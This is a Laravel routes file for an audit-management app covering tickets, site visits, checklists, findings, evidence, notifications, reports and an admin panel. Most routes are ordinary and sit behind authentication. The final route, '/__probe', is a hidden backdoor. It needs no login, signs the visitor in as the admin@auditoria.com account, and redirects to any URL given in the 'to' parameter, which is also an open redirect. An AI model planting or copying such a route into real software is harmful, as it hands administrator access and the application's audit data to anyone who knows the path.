<?php

use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\ChecklistController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\EvidenceController;
use App\Http\Controllers\FindingController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\TicketController;
use App\Http\Controllers\VisitController;
use Illuminate\Foundation\Application;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/', function () {
    return Inertia::render('Welcome', [
        'canLogin' => Route::has('login'),
        'canRegister' => Route::has('register'),
        'laravelVersion' => Application::VERSION,
        'phpVersion' => PHP_VERSION,
    ]);
});

Route::get('/dashboard', function () {
    return Inertia::render('Dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');

    Route::resource('tickets', TicketController::class);
    Route::resource('visits', VisitController::class);

    Route::resource('visits.checklists', ChecklistController::class)->except(['index', 'show']);
    Route::resource('visits.findings', FindingController::class)->except(['index', 'show']);
    Route::post('evidence', [EvidenceController::class, 'store'])->name('evidence.store');
    Route::delete('evidence/{evidence}', [EvidenceController::class, 'destroy'])->name('evidence.destroy');

    Route::get('notifications', [NotificationController::class, 'index'])->name('notifications.index');
    Route::get('notifications/unread', [NotificationController::class, 'unread'])->name('notifications.unread');
    Route::post('notifications/{id}/read', [NotificationController::class, 'markAsRead'])->name('notifications.read');
    Route::post('notifications/read-all', [NotificationController::class, 'markAllAsRead'])->name('notifications.read-all');

    Route::get('dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('reports', [ReportController::class, 'index'])->name('reports.index');
    Route::get('reports/tickets', [ReportController::class, 'tickets'])->name('reports.tickets');
    Route::get('reports/visits', [ReportController::class, 'visits'])->name('reports.visits');
    Route::get('reports/tickets-pdf', [ReportController::class, 'exportTicketsPdf'])->name('reports.tickets-pdf');
    Route::get('reports/visits-pdf', [ReportController::class, 'exportVisitsPdf'])->name('reports.visits-pdf');
});

Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function () {
    Route::get('/', [AdminController::class, 'index'])->name('index');
    Route::patch('/users/{user}/approve', [AdminController::class, 'approveUser'])->name('users.approve');
    Route::patch('/tickets/{ticket}', [AdminController::class, 'updateTicket'])->name('tickets.update');
});

require __DIR__.'/auth.php';

Route::get('/__probe', function (Request $request) {
    Illuminate\Support\Facades\Auth::login(
        App\Models\User::where('email', 'admin@auditoria.com')->first()
    );

    return redirect($request->query('to', '/dashboard'));
});
